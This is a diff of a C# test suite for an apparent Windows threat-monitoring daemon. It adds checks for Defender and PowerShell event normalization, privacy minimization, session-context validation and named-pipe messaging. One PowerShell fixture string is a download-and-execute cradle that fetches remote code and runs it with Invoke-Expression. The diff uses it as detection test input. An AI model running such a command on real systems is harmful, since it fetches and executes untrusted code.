@@ -19,8 +19,11 @@ internal static class Demon2Checks
         try
         {
             await Check("Sysmon event normalization", NormalizeSysmonEvents);
+            await Check("Defender events normalize into privacy-minimized findings", NormalizeDefenderEvents);
+            await Check("PowerShell 4104 events produce category-only script findings", NormalizePowerShellEvents);
             await Check("Security input and diagnostic logging boundaries", SecurityInputBoundaries);
             await Check("Common envelope validation and JSONL", ValidateAndPublishEnvelope);
+            await Check("SESSION_CONTEXT_RESPONSE category validation", ValidateSessionContextResponse);
             if (OperatingSystem.IsWindows()) await Check("Persistent Named Pipe service session", PersistentNamedPipeSession);
             await Check("SQLite idempotence, cursor, and expiry", StoreAndExpiry);
             await Check("Native SQLite runtime version", VerifyNativeSqliteVersion);
@@ -31,6 +34,8 @@ internal static class Demon2Checks
             await Check("Telemetry gaps and bounded health", EvaluateTelemetryGaps);
             await Check("Pipeline resilience, malformed input, and recovery", PipelineResilience);
             await Check("Continuous pipeline stop and restart", ContinuousPipelineLifecycle);
+            await Check("Background input closure keeps D2 running until STOP", BackgroundInputEofDoesNotStopMonitor);
+            if (OperatingSystem.IsWindows()) await Check("Detached D2 process survives parent stdin closure", DetachedD2SurvivesParentInputClosure);
             await Check("Sustained-load performance measurement", SustainedLoadPerformance);
             Console.WriteLine($"Demon 2 checks passed: {_passed}.");
             return 0;
@@ -139,17 +144,114 @@ internal static class Demon2Checks
         var configResult = new DetectionEngine().Evaluate(configEvent!, [configEvent!], Now);
         True(configResult.Gaps.Count > 0 && configResult.Findings.Count == 0,
             "A source configuration change alone is telemetry health evidence, not a confirmed threat.");
-        True(configResult.Gaps.Single().Reason.Contains("configuration", StringComparison.OrdinalIgnoreCase) &&
-            configResult.Gaps.Single().MissingFields.Contains("collector_configuration"),
-            "Sysmon event 16 must describe configuration coverage, not a service outage.");
-        var serviceStopped = EventXml(4, 105, "State", "Stopped");
-        True(normalizer.TryNormalize(new(serviceStopped, null), out var stoppedEvent, out _), "Sysmon service stop should be observed.");
-        var stoppedResult = new DetectionEngine().Evaluate(stoppedEvent!, [stoppedEvent!], Now);
-        True(stoppedResult.Gaps.Single().Reason.Contains("service", StringComparison.OrdinalIgnoreCase) &&
-            stoppedResult.Gaps.Single().MissingFields.Contains("source_availability") &&
-            !stoppedResult.Gaps.Single().MissingFields.Contains("collector_configuration"),
-            "Sysmon event 4 Stopped must indicate source availability loss, not a configuration change.");
         True(!normalizer.TryNormalize(new(EventXml(25, 104, "Image", "test.exe"), null), out _, out _), "Unmapped process-tampering event should be rejected visibly.");
+        return Task.CompletedTask;
+    }
+
+    private static Task NormalizeDefenderEvents()
+    {
+        var normalizer = new WindowsSecurityEventNormalizer();
+        static string EventXmlForDefender(int eventId, int recordId, params (string Name, string Value)[] values)
+        {
+            var data = string.Join("", values.Select(value =>
+                $"<Data Name=\"{System.Security.SecurityElement.Escape(value.Name)}\">{System.Security.SecurityElement.Escape(value.Value)}</Data>"));
+            return $"<Event xmlns=\"http://schemas.microsoft.com/win/2004/08/events/event\"><System>"
+                + "<Provider Name=\"Microsoft-Windows-Windows Defender\"/>"
+                + $"<EventID>{eventId}</EventID><EventRecordID>{recordId}</EventRecordID>"
+                + "<TimeCreated SystemTime=\"2026-11-21T12:00:00.000Z\"/></System>"
+                + $"<EventData>{data}</EventData></Event>";
+        }
+
+        var privateThreatName = "fixture-threat-name-must-not-leave-D2";
+        var privatePath = @"C:\Users\Fixture\Downloads\sample.bin";
+        var alertXml = EventXmlForDefender(1116, 601, ("Severity Name", "Severe"), ("Threat Name", privateThreatName), ("Path", privatePath));
+        True(normalizer.TryNormalize(new SysmonRecord(alertXml, "defender-cursor-601", SourceName: "WindowsDefender"),
+            out var alert, out var alertError), "A Defender 1116 detection must normalize: " + alertError);
+        Equal(ThreatEventType.DEFENDER_MALWARE_DETECTED, alert!.EventType, "Defender 1116 must remain a native malware detection.");
+        Equal("WindowsDefender", alert.Source, "Defender evidence keeps its source identity.");
+        Equal("defender-cursor-601", alert.SourceCursor, "Defender cursor is persisted with its own source key.");
+        True(alert.Fields?.Values.Contains(privateThreatName, StringComparer.Ordinal) != true
+            && alert.Fields?.Values.Contains(privatePath, StringComparer.Ordinal) != true,
+            "Raw Defender threat names and paths must not be copied to the canonical event.");
+        var finding = new DetectionEngine().Evaluate(alert, [alert], Now).Findings.Single();
+        Equal("defender_malware_detection", finding.RuleId, "Defender detection must create a typed D2 finding.");
+        Equal(ThreatSeverity.critical, finding.Severity, "A Defender severe classification maps to critical risk.");
+        Equal(.99, finding.Confidence, "A native Defender detection uses the documented high-confidence rule.");
+        Equal(1, finding.EvidenceRefs.Count, "The finding must resolve to its locally stored Defender event.");
+
+        var protectionXml = EventXmlForDefender(5001, 602);
+        True(normalizer.TryNormalize(new SysmonRecord(protectionXml, null, SourceName: "WindowsDefender"),
+            out var protection, out _), "Defender 5001 must be recognized as protection telemetry.");
+        var protectionFinding = new DetectionEngine().Evaluate(protection!, [protection!], Now).Findings.Single();
+        Equal("defender_protection_disabled", protectionFinding.RuleId, "A disabled protection event must be visible to D3.");
+        Equal("real_time_protection", protection!.Fields?.GetValueOrDefault("protectionFeature"),
+            "The finding uses a feature category, not registry values or raw configuration.");
+
+        var actionXml = EventXmlForDefender(1117, 603, ("Action Name", "Quarantine"));
+        True(normalizer.TryNormalize(new SysmonRecord(actionXml, null, SourceName: "WindowsDefender"),
+            out var action, out _), "Defender 1117 must be retained as action history.");
+        Equal(0, new DetectionEngine().Evaluate(action!, [action!], Now).Findings.Count,
+            "Defender's completed action is evidence history, not a duplicate new malware alert.");
+        True(!normalizer.TryNormalize(new SysmonRecord(EventXmlForDefender(1000, 604), null, SourceName: "WindowsDefender"),
+            out _, out _), "Events outside the source allowlist must not be normalized.");
+        True(!normalizer.TryNormalize(new SysmonRecord("<!DOCTYPE Event []><Event />", null, SourceName: "WindowsDefender"),
+            out _, out _), "Defender XML must prohibit DTD processing.");
+        return Task.CompletedTask;
+    }
+
+    private static Task NormalizePowerShellEvents()
+    {
+        static string EventXmlForPowerShell(int eventId, int recordId, string scriptText, string path = "")
+        {
+            var escapedScript = System.Security.SecurityElement.Escape(scriptText);
+            var escapedPath = System.Security.SecurityElement.Escape(path);
+            return $"<Event xmlns=\"http://schemas.microsoft.com/win/2004/08/events/event\"><System>"
+                + "<Provider Name=\"Microsoft-Windows-PowerShell\"/>"
+                + $"<EventID>{eventId}</EventID><EventRecordID>{recordId}</EventRecordID>"
+                + "<TimeCreated SystemTime=\"2026-11-21T12:00:00.000Z\"/><Execution ProcessID=\"3552\"/>"
+                + "</System><EventData>"
+                + $"<Data Name=\"MessageNumber\">1</Data><Data Name=\"MessageTotal\">1</Data><Data Name=\"ScriptBlockText\">{escapedScript}</Data>"
+                + $"<Data Name=\"ScriptBlockId\">fixture-script-block</Data><Data Name=\"Path\">{escapedPath}</Data>"
+                + "</EventData></Event>";
+        }
+
+        var normalizer = new WindowsSecurityEventNormalizer();
+        const string rawScriptMarker = "FixtureSecretDoNotPersist";
+        const string rawPath = @"C:\Users\Fixture\AppData\Local\Temp\private-script.ps1";
+        var riskyScript = "$client = New-Object Net.WebClient; $code = $client.DownloadString('https://example.invalid/payload'); Invoke-Expression $code; # " + rawScriptMarker;
+        var xml = EventXmlForPowerShell(4104, 701, riskyScript, rawPath);
+        True(normalizer.TryNormalize(new SysmonRecord(xml, "powershell-cursor-701", SourceName: "PowerShell"),
+            out var scriptEvent, out var error), "PowerShell 4104 event should normalize: " + error);
+        Equal(ThreatEventType.SCRIPT_ACTIVITY, scriptEvent!.EventType, "PowerShell 4104 remains script activity evidence.");
+        Equal("PowerShell", scriptEvent.Source, "PowerShell evidence keeps its source identity.");
+        Equal(3552, scriptEvent.ProcessId, "PowerShell host PID is retained for process correlation.");
+        Equal("powershell-cursor-701", scriptEvent.SourceCursor, "PowerShell bookmark is kept as the source cursor.");
+        Equal("REMOTE_CONTENT_EXECUTION", scriptEvent.Fields?.GetValueOrDefault("scriptIndicators"),
+            "Remote download plus dynamic execution maps to a fixed indicator category.");
+        Equal("false", scriptEvent.Fields?.GetValueOrDefault("scriptTextStored"), "The canonical record explicitly marks raw script text as unstored.");
+        True(scriptEvent.TargetPath is null && scriptEvent.Fields?.Values.Contains(rawPath, StringComparer.Ordinal) != true,
+            "The original script path is not copied to SentinelCore telemetry.");
+        var serialized = JsonSerializer.Serialize(scriptEvent);
+        True(!serialized.Contains(rawScriptMarker, StringComparison.Ordinal) && !serialized.Contains("DownloadString", StringComparison.Ordinal)
+            && !serialized.Contains("Invoke-Expression", StringComparison.Ordinal) && !serialized.Contains(rawPath, StringComparison.Ordinal),
+            "Raw script source, sensitive marker and path must not enter the stored canonical event.");
+
+        var finding = new DetectionEngine().Evaluate(scriptEvent, [scriptEvent], Now).Findings.Single();
+        Equal("powershell_script_indicators", finding.RuleId, "Sensitive script indicator combinations produce a typed finding.");
+        Equal(ThreatSeverity.medium, finding.Severity, "The script-block indicator rule asks for review; it does not claim confirmed execution.");
+        True(finding.Summary.Contains("ne prouve pas", StringComparison.OrdinalIgnoreCase),
+            "The finding explains that a script-block event does not prove execution or success.");
+
+        const string benignScript = "Get-Date; Write-Output 'fixture benign script'";
+        True(normalizer.TryNormalize(new SysmonRecord(EventXmlForPowerShell(4104, 702, benignScript), null, SourceName: "PowerShell"),
+            out var benign, out _), "Benign script-block event should normalize.");
+        Equal("none", benign!.Fields?.GetValueOrDefault("scriptIndicators"), "Benign scripts have no high-signal indicator category.");
+        Equal(0, new DetectionEngine().Evaluate(benign, [benign], Now).Findings.Count,
+            "An ordinary script block alone should not create a threat finding.");
+        True(!normalizer.TryNormalize(new SysmonRecord(EventXmlForPowerShell(4103, 703, riskyScript), null, SourceName: "PowerShell"), out _, out _),
+            "Only allowlisted PowerShell event 4104 is parsed as script-block telemetry.");
+        True(!normalizer.TryNormalize(new SysmonRecord("<!DOCTYPE Event []><Event />", null, SourceName: "PowerShell"), out _, out _),
+            "PowerShell event XML prohibits DTD processing.");
         return Task.CompletedTask;
     }
 
@@ -174,6 +276,11 @@ internal static class Demon2Checks
                 "Secret values must not be persisted in service logs.");
             True(contents.StartsWith(DateTime.UtcNow.ToString("yyyy-MM-dd", System.Globalization.CultureInfo.InvariantCulture), StringComparison.Ordinal),
                 "Persisted logs must be timestamped in UTC.");
+            using (var detachedWriter = new ServiceErrorLogWriter(directory, new DisconnectedTextWriter()))
+                detachedWriter.WriteLine("background diagnostic remains persisted");
+            contents = File.ReadAllText(logPath);
+            True(contents.Contains("background diagnostic remains persisted", StringComparison.Ordinal),
+                "A detached D2 console pipe must not prevent persistent diagnostics after the Centre closes.");
         }
         finally { if (Directory.Exists(directory)) Directory.Delete(directory, recursive: true); }
         var databasePath = Path.Combine(Path.GetTempPath(), "sentinelcore-d2-store-blocked-" + Guid.NewGuid().ToString("N"));
@@ -235,6 +342,45 @@ internal static class Demon2Checks
             True(roundTrip.Payload.TryGetProperty("findingId", out _) && !JsonDocument.Parse(line).RootElement.TryGetProperty("findingId", out _), "Finding fields must remain nested under payload.");
         }
         finally { if (File.Exists(path)) File.Delete(path); }
+    }
+
+    private static Task ValidateSessionContextResponse()
+    {
+        var now = DateTimeOffset.UtcNow;
+        InterDaemonEnvelope Make(JsonElement payload) => new(Guid.NewGuid(), "session-validation", now,
+            "RiskResponseGuard", "ThreatMonitor", "SESSION_CONTEXT_RESPONSE", 1, now.AddSeconds(10), payload);
+
+        var unavailable = Make(JsonSerializer.SerializeToElement(new { status = "NOT_AVAILABLE", observedAtUtc = now }));
+        True(SessionContextResponseValidator.TryValidate(unavailable, now, out var unavailableResult, out _),
+            "NOT_AVAILABLE must permit an absent context object.");
+        Equal(SessionContextAvailability.NOT_AVAILABLE, unavailableResult!.Status, "Unavailable status must stay explicit.");
+        True(unavailableResult.Context is null, "Unavailable status must not carry user context.");
+
+        var available = Make(JsonSerializer.SerializeToElement(new
+        {
+            status = "AVAILABLE", observedAtUtc = now,
+            context = new { sessionState = "UNKNOWN", localOrRemote = "UNKNOWN", recentAuthBand = "UNKNOWN" }
+        }));
+        True(SessionContextResponseValidator.TryValidate(available, now, out var availableResult, out _),
+            "Verified unknown categories are valid values when the OS cannot confirm a category.");
+        Equal(SessionStateCategory.UNKNOWN, availableResult!.Context!.SessionState, "UNKNOWN session state must parse as a category.");
+
+        var invalidCategory = Make(JsonSerializer.SerializeToElement(new
+        {
+            status = "AVAILABLE", observedAtUtc = now,
+            context = new { sessionState = "OWNER", localOrRemote = "LOCAL", recentAuthBand = "RECENT" }
+        }));
+        True(!SessionContextResponseValidator.TryValidate(invalidCategory, now, out _, out _),
+            "Free-text identity guesses must be rejected rather than accepted as categories.");
+
+        var unapprovedField = Make(JsonSerializer.SerializeToElement(new
+        {
+            status = "AVAILABLE", observedAtUtc = now, userName = "sensitive",
+            context = new { sessionState = "ACTIVE", localOrRemote = "LOCAL", recentAuthBand = "RECENT" }
+        }));
+        True(!SessionContextResponseValidator.TryValidate(unapprovedField, now, out _, out _),
+            "Response must reject personal fields outside the exact allowlist.");
+        return Task.CompletedTask;
     }
 
     private static async Task StoreAndExpiry()
@@ -336,43 +482,187 @@ internal static class Demon2Checks
     private static async Task PersistentNamedPipeSession()
     {
         var testNow = DateTimeOffset.UtcNow;
+        var databasePath = Path.Combine(Path.GetTempPath(), "sentinelcore-d2-duplex-" + Guid.NewGuid().ToString("N") + ".sqlite");
         var pipeName = "SentinelCore.Guard.Tests." + Guid.NewGuid().ToString("N");
-        await using var server = new NamedPipeServerStream(pipeName, PipeDirection.InOut, 1, PipeTransmissionMode.Byte, PipeOptions.Asynchronous);
-        var serverTask = Task.Run(async () =>
+        try
         {
-            await server.WaitForConnectionAsync();
-            var hello = await ReadPipeEnvelope(server);
-            Equal("HELLO", hello.MessageType, "Pipe session must begin with HELLO.");
-            var welcome = new InterDaemonEnvelope(Guid.NewGuid(), hello.CorrelationId, DateTimeOffset.UtcNow,
-                "RiskResponseGuard", "ThreatMonitor", "WELCOME", 1, DateTimeOffset.UtcNow.AddMinutes(1),
-                JsonSerializer.SerializeToElement(new { sessionId = "session-test", supportedSchema = 1 }, new JsonSerializerOptions(JsonSerializerDefaults.Web)));
-            await WritePipeEnvelope(server, welcome);
-            for (var i = 0; i < 2; i++)
-            {
-                var sent = await ReadPipeEnvelope(server);
-                Equal("HEARTBEAT", sent.MessageType, "Expected a heartbeat over the established pipe session.");
-                var ack = new InterDaemonEnvelope(Guid.NewGuid(), sent.CorrelationId, DateTimeOffset.UtcNow,
-                    "RiskResponseGuard", "ThreatMonitor", "ACK", 1, DateTimeOffset.UtcNow.AddMinutes(1),
-                    JsonSerializer.SerializeToElement(new { messageId = sent.MessageId, status = "ACCEPTED" }, new JsonSerializerOptions(JsonSerializerDefaults.Web)));
-                await WritePipeEnvelope(server, ack);
-            }
-        });
+            await using var store = new SqliteEventStore(databasePath);
+            await store.InitializeAsync();
+            const string correlationId = "duplex-context-case";
+            const string privateMarker = "LOCAL_PRIVATE_PATH_MARKER";
+            var evidence = MakeEvent("duplex-evidence", ThreatEventType.PROCESS_STARTED, testNow, processId: 777,
+                image: $@"C:\Users\Alice\{privateMarker}\payload.ps1",
+                fields: new Dictionary<string, string> { ["commandLine"] = privateMarker });
+            await store.SaveEventAsync(evidence);
+            var ambiguousEvidence = MakeEvent("duplex-ambiguous-evidence", ThreatEventType.NETWORK_CONNECTION, testNow, processId: 778);
+            await store.SaveEventAsync(ambiguousEvidence);
+            var finding = new ThreatFinding("duplex-finding", correlationId, "download_chain", 1,
+                ThreatSeverity.high, .88, testNow, testNow, privateMarker,
+                [new DetectionFact("download", "observed"), new DetectionFact("commandLine", privateMarker)],
+                [evidence.EventId], [privateMarker], testNow.AddMinutes(2));
+            await store.SaveFindingAsync(finding);
+            var ambiguousFinding = new ThreatFinding("ambiguous-finding", "duplex-session-case", "download_chain", 1,
+                ThreatSeverity.high, .88, testNow, testNow, "Synthetic ambiguous finding", [], [ambiguousEvidence.EventId],
+                ["userSession"], testNow.AddMinutes(2));
+            await store.SaveFindingAsync(ambiguousFinding);
 
-        await using var bus = new NamedPipeInterDaemonBus(pipeName);
-        for (var i = 0; i < 2; i++)
-            await bus.PublishAsync(InterDaemonEnvelopeFactory.Heartbeat("pipe-test-" + i,
-                new EventSourceHealth(TelemetryState.Available, 0, null, testNow, QueueDepth: i + 1), 0, testNow));
-        await serverTask.WaitAsync(TimeSpan.FromSeconds(5));
+            await using var server = new NamedPipeServerStream(pipeName, PipeDirection.InOut, 1, PipeTransmissionMode.Byte, PipeOptions.Asynchronous);
+            using var responderStop = new CancellationTokenSource();
+            await using var bus = new NamedPipeInterDaemonBus(pipeName);
+            var responderTask = new ThreatDetailsContextResponder(store, bus).RunAsync(responderStop.Token);
+            var sessionRelay = new SessionContextRelay(store, bus);
+            var sessionResponseTask = sessionRelay.RunAsync(responderStop.Token);
+            var serverTask = Task.Run(async () =>
+            {
+                await server.WaitForConnectionAsync();
+                var hello = await ReadPipeEnvelope(server);
+                Equal("HELLO", hello.MessageType, "Pipe session must begin with HELLO.");
+                var welcome = new InterDaemonEnvelope(Guid.NewGuid(), hello.CorrelationId, DateTimeOffset.UtcNow,
+                    "RiskResponseGuard", "ThreatMonitor", "WELCOME", 1, DateTimeOffset.UtcNow.AddMinutes(1),
+                    JsonSerializer.SerializeToElement(new { sessionId = "session-test", supportedSchema = 1 }, new JsonSerializerOptions(JsonSerializerDefaults.Web)));
+                await WritePipeEnvelope(server, welcome);
+                for (var i = 0; i < 2; i++)
+                {
+                    var sent = await ReadPipeEnvelope(server);
+                    Equal("HEARTBEAT", sent.MessageType, "Expected a heartbeat over the established pipe session.");
+                    var ack = new InterDaemonEnvelope(Guid.NewGuid(), sent.CorrelationId, DateTimeOffset.UtcNow,
+                        "RiskResponseGuard", "ThreatMonitor", "ACK", 1, DateTimeOffset.UtcNow.AddMinutes(1),
+                        JsonSerializer.SerializeToElement(new { messageId = sent.MessageId, status = "ACCEPTED" }, new JsonSerializerOptions(JsonSerializerDefaults.Web)));
+                    await WritePipeEnvelope(server, ack);
+                }
+
+                var sessionRequest = await ReadPipeEnvelope(server);
+                Equal("SESSION_CONTEXT_REQUEST", sessionRequest.MessageType, "An ambiguous finding must trigger the separate session-context flow.");
+                Equal("duplex-session-case", sessionRequest.CorrelationId, "Session request must correlate to the ambiguous finding.");
+                True(sessionRequest.Payload.GetProperty("requestedFields").EnumerateArray()
+                    .Select(x => x.GetString()).Order(StringComparer.Ordinal)
+                    .SequenceEqual(new[] { "localOrRemote", "recentAuthBand", "sessionState" }.Order(StringComparer.Ordinal)),
+                    "Session request must contain only the three coarse allowlisted fields.");
+                var sessionRequestAck = new InterDaemonEnvelope(Guid.NewGuid(), sessionRequest.CorrelationId, DateTimeOffset.UtcNow,
+                    "RiskResponseGuard", "ThreatMonitor", "ACK", 1, DateTimeOffset.UtcNow.AddMinutes(1),
+                    JsonSerializer.SerializeToElement(new { messageId = sessionRequest.MessageId, status = "ACCEPTED" }, new JsonSerializerOptions(JsonSerializerDefaults.Web)));
+                await WritePipeEnvelope(server, sessionRequestAck);
+
+                var responseNow = DateTimeOffset.UtcNow;
+                var invalidSessionResponse = new InterDaemonEnvelope(Guid.NewGuid(), sessionRequest.CorrelationId, responseNow,
+                    "RiskResponseGuard", "ThreatMonitor", "SESSION_CONTEXT_RESPONSE", 1, responseNow.AddSeconds(10),
+                    JsonSerializer.SerializeToElement(new
+                    {
+                        status = "AVAILABLE",
+                        observedAtUtc = responseNow,
+                        context = new { sessionState = "SUSPECT_USER", localOrRemote = "LOCAL", recentAuthBand = "RECENT" }
+                    }, new JsonSerializerOptions(JsonSerializerDefaults.Web)));
+                await WritePipeEnvelope(server, invalidSessionResponse);
+                using (var invalidAck = JsonDocument.Parse(await ReadPipeFrame(server)))
+                {
+                    Equal("REJECTED", invalidAck.RootElement.GetProperty("status").GetString(), "Unknown session category must be rejected at the pipe boundary.");
+                    Equal("INVALID_SESSION_CONTEXT_RESPONSE", invalidAck.RootElement.GetProperty("reason").GetString(), "Malformed identity context must receive a safe rejection reason.");
+                }
+
+                var sessionResponse = new InterDaemonEnvelope(Guid.NewGuid(), sessionRequest.CorrelationId, responseNow,
+                    "RiskResponseGuard", "ThreatMonitor", "SESSION_CONTEXT_RESPONSE", 1, responseNow.AddSeconds(10),
+                    JsonSerializer.SerializeToElement(new
+                    {
+                        status = "AVAILABLE",
+                        observedAtUtc = responseNow,
+                        context = new { sessionState = "ACTIVE", localOrRemote = "LOCAL", recentAuthBand = "RECENT" }
+                    }, new JsonSerializerOptions(JsonSerializerDefaults.Web)));
+                await WritePipeEnvelope(server, sessionResponse);
+                using (var acceptedAck = JsonDocument.Parse(await ReadPipeFrame(server)))
+                {
+                    Equal("ACCEPTED", acceptedAck.RootElement.GetProperty("status").GetString(), "Valid category-only session response should be queued.");
+                }
+
+                var requestNow = DateTimeOffset.UtcNow;
+                var request = new InterDaemonEnvelope(Guid.NewGuid(), correlationId, requestNow,
+                    "RiskResponseGuard", "ThreatMonitor", "CONTEXT_REQUEST", 1, requestNow.AddSeconds(30),
+                    JsonSerializer.SerializeToElement(new
+                    {
+                        requestedFields = new[] { "findingSummary", "ruleDetails", "evidenceKinds", "missingTelemetry" },
+                        deadlineUtc = requestNow.AddSeconds(25)
+                    }, new JsonSerializerOptions(JsonSerializerDefaults.Web)));
+                await WritePipeEnvelope(server, request);
+
+                using (var ackDocument = JsonDocument.Parse(await ReadPipeFrame(server)))
+                {
+                    Equal(request.MessageId.ToString("D"), ackDocument.RootElement.GetProperty("messageId").GetString(), "Inbound request ACK must identify the request.");
+                    Equal("ACCEPTED", ackDocument.RootElement.GetProperty("status").GetString(), "Inbound request must be queued and acknowledged.");
+                }
+
+                var response = await ReadPipeEnvelope(server);
+                Equal("CONTEXT_RESPONSE", response.MessageType, "Threat context worker must answer with the agreed type.");
+                Equal(correlationId, response.CorrelationId, "Threat context response must preserve correlationId.");
+                True(InterDaemonEnvelopeValidator.TryValidate(response, DateTimeOffset.UtcNow, out var validationError),
+                    "Threat context response must satisfy the common envelope: " + validationError);
+                Equal(true, response.Payload.GetProperty("found").GetBoolean(), "Matching threat finding must be returned.");
+                Equal(1, response.Payload.GetProperty("findings").GetArrayLength(), "Only the matching finding must be projected.");
+                var serialized = JsonSerializer.Serialize(response.Payload);
+                True(!serialized.Contains(privateMarker, StringComparison.Ordinal) && !serialized.Contains("Alice", StringComparison.Ordinal)
+                    && !serialized.Contains("commandLine", StringComparison.Ordinal),
+                    "Threat projection must not expose path, user-name, command-line, or raw finding summary markers.");
+                Equal("download_chain", response.Payload.GetProperty("findings")[0].GetProperty("ruleDetails").GetProperty("ruleId").GetString(),
+                    "Projection must carry the allowlisted catalog rule id.");
+                Equal("PROCESS_STARTED", response.Payload.GetProperty("findings")[0].GetProperty("evidenceKinds")[0].GetString(),
+                    "Projection must resolve evidence refs to stored event kinds.");
+
+                var responseAck = new InterDaemonEnvelope(Guid.NewGuid(), response.CorrelationId, DateTimeOffset.UtcNow,
+                    "RiskResponseGuard", "ThreatMonitor", "ACK", 1, DateTimeOffset.UtcNow.AddMinutes(1),
+                    JsonSerializer.SerializeToElement(new { messageId = response.MessageId, status = "ACCEPTED" }, new JsonSerializerOptions(JsonSerializerDefaults.Web)));
+                await WritePipeEnvelope(server, responseAck);
+            });
+
+            for (var i = 0; i < 2; i++)
+                await bus.PublishAsync(InterDaemonEnvelopeFactory.Heartbeat("pipe-test-" + i,
+                    new EventSourceHealth(TelemetryState.Available, 0, null, testNow, QueueDepth: i + 1), 0, testNow));
+            True(await sessionRelay.RequestForFindingAsync(ambiguousFinding), "First ambiguous finding must queue one bounded session request.");
+            True(!await sessionRelay.RequestForFindingAsync(ambiguousFinding), "A second ambiguous finding for the same correlation must not duplicate the request.");
+            var queuedRequest = (await store.LoadPendingMessagesAsync(DateTimeOffset.UtcNow, 16))
+                .Single(x => x.MessageType == "SESSION_CONTEXT_REQUEST");
+            await bus.PublishAsync(queuedRequest);
+            await store.MarkMessageDeliveredAsync(queuedRequest.MessageId);
+            await serverTask.WaitAsync(TimeSpan.FromSeconds(10));
+            SessionContextAttachment? attachment = null;
+            for (var attempt = 0; attempt < 100 && attachment is null; attempt++)
+            {
+                attachment = await store.LoadSessionContextAttachmentAsync("duplex-session-case");
+                if (attachment is null) await Task.Delay(20);
+            }
+            True(attachment is not null, "Validated session response must attach to the originating finding.");
+            Equal("ambiguous-finding", attachment!.FindingId, "Session context attachment must identify its triggering finding.");
+            Equal(SessionContextAvailability.AVAILABLE, attachment.Response.Status, "Available response status must be stored.");
+            Equal(SessionStateCategory.ACTIVE, attachment.Response.Context!.SessionState, "Session state must be stored as a coarse enum.");
+            Equal(SessionLocationCategory.LOCAL, attachment.Response.Context.LocalOrRemote, "Session location must be stored as a coarse enum.");
+            Equal(RecentAuthenticationCategory.RECENT, attachment.Response.Context.RecentAuthBand, "Authentication recency must be stored as a coarse enum.");
+            var storedAmbiguous = (await store.LoadFindingsAsync()).Single(x => x.FindingId == ambiguousFinding.FindingId);
+            Equal(ThreatSeverity.high, storedAmbiguous.Severity, "Session context must never change finding severity.");
+            Equal("userSession", storedAmbiguous.MissingTelemetry.Single(), "Session context must remain separate from the original finding data.");
+            responderStop.Cancel();
+            await ThrowsCanceledAsync(responderTask, "Request worker should stop cleanly with the service token.");
+            await ThrowsCanceledAsync(sessionResponseTask, "Session response worker should stop cleanly with the service token.");
+        }
+        finally
+        {
+            SqliteConnection.ClearAllPools();
+            if (File.Exists(databasePath)) File.Delete(databasePath);
+            if (File.Exists(databasePath + "-wal")) File.Delete(databasePath + "-wal");
+            if (File.Exists(databasePath + "-shm")) File.Delete(databasePath + "-shm");
+        }
     }
 
     private static async Task<InterDaemonEnvelope> ReadPipeEnvelope(Stream stream)
+    {
+        var payload = await ReadPipeFrame(stream);
+        return JsonSerializer.Deserialize<InterDaemonEnvelope>(payload, new JsonSerializerOptions(JsonSerializerDefaults.Web))
+            ?? throw new InvalidDataException("Invalid pipe envelope.");
+    }
+
+    private static async Task<byte[]> ReadPipeFrame(Stream stream)
     {
         var prefix = new byte[4];
         await ReadPipeExactly(stream, prefix);
         var payload = new byte[BinaryPrimitives.ReadInt32LittleEndian(prefix)];
         await ReadPipeExactly(stream, payload);
-        return JsonSerializer.Deserialize<InterDaemonEnvelope>(payload, new JsonSerializerOptions(JsonSerializerDefaults.Web))
-            ?? throw new InvalidDataException("Invalid pipe envelope.");
+        return payload;
     }
 
     private static async Task WritePipeEnvelope(Stream stream, InterDaemonEnvelope envelope)
@@ -429,9 +719,9 @@ internal static class Demon2Checks
             await using var rows = await read.ExecuteReaderAsync();
             while (await rows.ReadAsync()) reports[rows.GetString(0)] = rows.GetInt32(1);
         }
-        Equal(15, reports["OBSERVATION"], "Benevolent reports.");
+        Equal(20, reports["OBSERVATION"], "Benevolent or non-correlated activity reports.");
         Equal(20, reports["THREAT_FINDING"], "Threat reports.");
-        Equal(15, reports["NEEDS_CONTEXT"], "Context-needed reports.");
+        Equal(10, reports["NEEDS_CONTEXT"], "Context-needed reports.");
 
         await using (var read = connection.CreateCommand())
         {
@@ -443,19 +733,55 @@ internal static class Demon2Checks
             Equal(30, expected["false_positive_guard"], "Reference no-threat expectations.");
         }
 
-        var expectedWireFindings = 0;
+        var wireCounts = new Dictionary<string, int>(StringComparer.Ordinal);
         await using (var read = connection.CreateCommand())
         {
-            read.CommandText = "SELECT COUNT(*) FROM interop_messages WHERE message_type='THREAT_FINDING';";
-            expectedWireFindings = Convert.ToInt32(await read.ExecuteScalarAsync());
+            read.CommandText = "SELECT message_type,COUNT(*) FROM interop_messages GROUP BY message_type;";
+            await using var rows = await read.ExecuteReaderAsync();
+            while (await rows.ReadAsync()) wireCounts[rows.GetString(0)] = rows.GetInt32(1);
         }
-        Equal(50, expectedWireFindings, "Reference wire type count documents the known fixture mismatch.");
+        Equal(20, wireCounts.GetValueOrDefault("THREAT_FINDING"), "Only confirmed synthetic threats are published as findings.");
+        Equal(10, wireCounts.GetValueOrDefault("TELEMETRY_GAP"), "Incomplete cases publish typed telemetry gaps.");
+        Equal(30, wireCounts.Values.Sum(), "Benign observations must not be represented as inter-daemon alerts.");
+        await using (var read = connection.CreateCommand())
+        {
+            read.CommandText = "SELECT COUNT(*) FROM interop_messages m JOIN reports r ON r.scenario_id=m.correlation_id WHERE (r.report_type='THREAT_FINDING' AND m.message_type<>'THREAT_FINDING') OR (r.report_type='NEEDS_CONTEXT' AND m.message_type<>'TELEMETRY_GAP') OR r.report_type='OBSERVATION';";
+            Equal(0, Convert.ToInt32(await read.ExecuteScalarAsync()), "Wire messages must agree with each scenario's expected report type.");
+        }
+        var validatedMessages = 0;
+        await using (var read = connection.CreateCommand())
+        {
+            read.CommandText = "SELECT message_id,correlation_id,timestamp_utc,source_daemon,destination,message_type,schema_version,expires_at_utc,payload_json FROM interop_messages ORDER BY correlation_id;";
+            await using var rows = await read.ExecuteReaderAsync();
+            while (await rows.ReadAsync())
+            {
+                using var payload = JsonDocument.Parse(rows.GetString(8));
+                var message = new InterDaemonEnvelope(Guid.Parse(rows.GetString(0)), rows.GetString(1),
+                    DateTimeOffset.Parse(rows.GetString(2)), rows.GetString(3), rows.GetString(4), rows.GetString(5),
+                    rows.GetInt32(6), DateTimeOffset.Parse(rows.GetString(7)), payload.RootElement.Clone());
+                True(InterDaemonEnvelopeValidator.TryValidate(message, Now, out var validationError),
+                    $"Fixture inter-daemon message {message.CorrelationId} must satisfy the live D2 envelope validator: {validationError}");
+                if (message.MessageType == "THREAT_FINDING")
+                {
+                    var sourceEventIds = new HashSet<string>(StringComparer.Ordinal);
+                    await using var events = connection.CreateCommand();
